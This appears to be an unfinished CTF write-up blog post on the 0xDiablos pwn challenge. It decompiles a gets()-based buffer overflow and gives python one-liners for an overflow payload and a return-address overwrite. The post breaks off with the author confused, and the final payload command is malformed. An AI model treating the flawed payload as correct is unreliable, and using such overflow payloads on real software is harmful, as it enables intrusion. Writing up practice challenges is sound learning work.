[**slyone999’s Security Blog**] (https://slyone999.github.io)

[//]: # (# -- 5 spaces before)
[//]: # (## -- 4 spaces before)
[//]: # (### -- 3 spaces before)
[//]: # (#### -- 2 spaces before)
[//]: # (##### -- 1 space before)


# Info#
Challenge - 0xDiablos
Type - Pwn
# Info
The download contains an executable called vuln. 

When running the application the following happens - 

```
./vuln
You know who are 0xDiablos: 
test
test

```
The application can be examined by either R2 or Ghidra. I used Ghidra 

The main function calls a function called vuln.
This function uses gets.
the gets function is vulnerable to a buffer overflow. 

```
void vuln(void)

{
  char local_bc [180];
  
  gets(local_bc);
  puts(local_bc);
  return;
}
```
The buffer is 180 so by using a bit of python you can fill the buffer. 
python -c "print 'A' * 184" | ./vuln

```
python -c "print 'A' * 184" | ./vuln
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

Examining the code you need to get to address 0804bf08(*) 

python -c "print 'A' * 184" + "\x08\xbf\x04\x08" | ./vuln



I am confused !!!
The buffer local_bc is 180 long 



## NMap



### Bash